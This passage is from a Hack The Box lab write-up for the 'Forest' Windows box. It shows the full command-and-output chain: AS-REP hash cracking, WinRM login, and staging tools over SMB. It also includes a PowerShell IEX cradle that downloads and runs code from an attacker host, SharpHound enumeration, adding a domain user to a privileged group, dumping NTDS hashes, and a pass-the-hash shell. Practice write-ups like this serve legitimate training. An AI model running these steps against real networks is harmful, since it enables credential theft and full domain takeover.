Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: $krb5asrep$23$svc-alfresco@HTB.LOCAL:acec1a2bb5496a...9f218a
Time.Started.....: Tue Jan  9 05:41:40 2024 (36 secs)
Time.Estimated...: Tue Jan  9 05:42:16 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Mod........: Rules (/usr/share/hashcat/rules/InsidePro-PasswordsPro.rule)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   828.4 kH/s (9.47ms) @ Accel:16 Loops:256 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 29733824/46389741090 (0.06%)
Rejected.........: 0/29733824 (0.00%)
Restore.Point....: 9184/14344385 (0.06%)
Restore.Sub.#1...: Salt:0 Amplifier:768-1024 Iteration:0-256
Candidate.Engine.: Device Generator
Candidates.#1....: DO+UGAL -> sassy123
Hardware.Mon.#1..: Util: 37%

Started: Tue Jan  9 05:41:39 2024
Stopped: Tue Jan  9 05:42:17 2024
```

Using Evil-Winrm to login as ‘svc-alfresco’

```bash
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Forest]
└─$ evil-winrm -i 10.10.10.161 -u svc-alfresco -p 's3rvice' 
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> whoami
htb\svc-alfresco
```

Obtaining the user flag

```bash
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> cd ..
*Evil-WinRM* PS C:\Users\svc-alfresco> cd Desktop
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> type user.txt
70a574d983a2336a9a63ae4a0a0d154e
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop>
```

Priv-Esc

```bash
*Evil-WinRM* PS darshan:\> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

Transferring winpeas to machine using “Impacket-smbserver”

```bash

On Our Machine: 
┌──(darshan㉿kali)-[~/…/Windows-boxes/Forest/notion/smb]
└─$ impacket-smbserver test $(pwd) -user darshan -password darshan
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed

On Victim's Machine
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> $pass = convertto-securestring 'darshan' -AsPlainText -Force
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> $pass
System.Security.SecureString
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> $cred = New-Object System.Management.Automation.PSCredential('darshan', $pass)
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> $cred

UserName                     Password
--------                     --------
darshan  System.Security.SecureString

*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> New-PSDrive -Name darshan -PSProvider FileSystem -Credential $cred -Root \\10.10.14.9\test

Name           Used (GB)     Free (GB) Provider      Root                                                                                                                                                                                 CurrentLocation
----           ---------     --------- --------      ----                                                                                                                                                                                 ---------------
darshan                                FileSystem    \\10.10.14.9\test

*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop>

-----Meanwhile on our machine-----
[*] Incoming connection (10.10.10.161,49481)
[*] AUTHENTICATE_MESSAGE (\,FOREST)
[*] Could not authenticate user!
[*] AUTHENTICATE_MESSAGE (\,FOREST)
[*] Could not authenticate user!
[*] AUTHENTICATE_MESSAGE (\darshan,FOREST)
[*] User FOREST\darshan authenticated successfully
[*] darshan:::aaaaaaaaaaaaaaaa:d173bde418e58393ab0a6fd9756f575c:0101000000000000800427b8f042da01383ac9580e3e3236000000000100100069006300650053004c006400520042000300100069006300650053004c006400520042000200100074004600420074004100750046004c000400100074004600420074004100750046004c0007000800800427b8f042da0106000400020000000800300030000000000000000000000000200000133f72eb23d931de4d6ff65663883b958dd9aa7fca41fbe7ac290295f830210d0a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310034002e003900000000000000000000000000

----Victim's Machine-----
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> New-PSDrive -Name darshan -PSProvider FileSystem -Credential $cred -Root \\10.10.14.9\test

Name           Used (GB)     Free (GB) Provider      Root                                                                                                                                                                                 CurrentLocation
----           ---------     --------- --------      ----                                                                                                                                                                                 ---------------
darshan                                FileSystem    \\10.10.14.9\test
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> cd darshan:
*Evil-WinRM* PS darshan:\> dir

    Directory: \\10.10.14.9\test

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         1/9/2024   3:16 AM        2387456 winPEASx64.exe
```

Altnerative to Download a file from our machine to victim’s machine

```bash
powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString("http://10.10.14.9/winPEASx64.exe")
																OR
iex(new-object net.webclient).downloadstring("http://10.10.14.9/winPEASx64.exe")
```

Download bloodhound, copy Sharphound.exe to our smb folder and run sharphound.ex on victim’s machine

```bash
*Evil-WinRM* PS darshan:\> .\SharpHound.exe -c all
2024-01-09T04:11:29.9780165-08:00|INFORMATION|This version of SharpHound is compatible with the 4.3.1 Release of BloodHound
2024-01-09T04:11:32.5094446-08:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2024-01-09T04:11:37.6813853-08:00|INFORMATION|Initializing SharpHound at 4:11 AM on 1/9/2024
2024-01-09T04:11:41.0561659-08:00|INFORMATION|[CommonLib LDAPUtils]Found usable Domain Controller for htb.local : FOREST.htb.local
2024-01-09T04:11:42.7280868-08:00|INFORMATION|Flags: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2024-01-09T04:11:47.0405541-08:00|INFORMATION|Beginning LDAP search for htb.local
2024-01-09T04:11:47.1812062-08:00|INFORMATION|Producer has finished, closing LDAP channel
2024-01-09T04:11:47.1968029-08:00|INFORMATION|LDAP channel closed, waiting for consumers
2024-01-09T04:12:17.1812838-08:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 40 MB RAM
2024-01-09T04:12:37.2594045-08:00|INFORMATION|Consumers finished, closing output channel
2024-01-09T04:12:37.3062830-08:00|INFORMATION|Output channel closed, waiting for output task to complete
2024-01-09T04:12:47.1974219-08:00|INFORMATION|Status: 124 objects finished (+124 2.066667)/s -- Using 50 MB RAM
Closing writers
2024-01-09T04:13:10.2751531-08:00|INFORMATION|Status: 161 objects finished (+37 1.939759)/s -- Using 50 MB RAM
2024-01-09T04:13:10.2751531-08:00|INFORMATION|Enumeration finished in 00:01:23.2462989
2024-01-09T04:14:08.1814684-08:00|INFORMATION|Saving cache with stats: 118 ID to type mappings.
 118 name to SID mappings.
 0 machine sid mappings.
 2 sid to domain mappings.
 0 global catalog mappings.
2024-01-09T04:14:10.5095985-08:00|INFORMATION|SharpHound Enumeration Completed at 4:14 AM on 1/9/2024! Happy Graphing!
```

Adding a new user to the domain

```bash
*Evil-WinRM* PS darshan:\> net user darshan darshan /add /domain
The command completed successfully.

-----Adding user to "Exchange Windows Permissions" group ------
*Evil-WinRM* PS darshan:\> net group "Exchange Windows Permissions"
Group name     Exchange Windows Permissions
Comment        This group contains Exchange servers that run Exchange cmdlets on behalf of users via the management service. Its members have permission to read and modify all Windows accounts and groups. This group should not be deleted.

Members

-------------------------------------------------------------------------------
The command completed successfully.
*Evil-WinRM* PS darshan:\> net group "Exchange Windows Permissions" /add darshan
The command completed successfully.

*Evil-WinRM* PS darshan:\> net group "Exchange Windows Permissions"
Group name     Exchange Windows Permissions
Comment        This group contains Exchange servers that run Exchange cmdlets on behalf of users via the management service. Its members have permission to read and modify all Windows accounts and groups. This group should not be deleted.

Members

-------------------------------------------------------------------------------
darshan
The command completed successfully.
```

Alternatively, I can also run `secretsdump.py` and get hashes:

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Forest]
└─$ secretsdump.py svc-alfresco:s3rvice@10.10.10.161
Impacket v0.9.19-dev - Copyright 2018 SecureAuth Corporation

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\$331000-VK4ADACQNUCA:1123:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
...[snip]...
[*] Cleaning up... 
```

** Shell **
With the hashes for Administrator, I can connect with a tool like `wmiexec`:

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Forest]
└─$  wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 htb.local/administrator@10.10.10.161
Impacket v0.9.19-dev - Copyright 2018 SecureAuth Corporation

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
htb\administrator
```
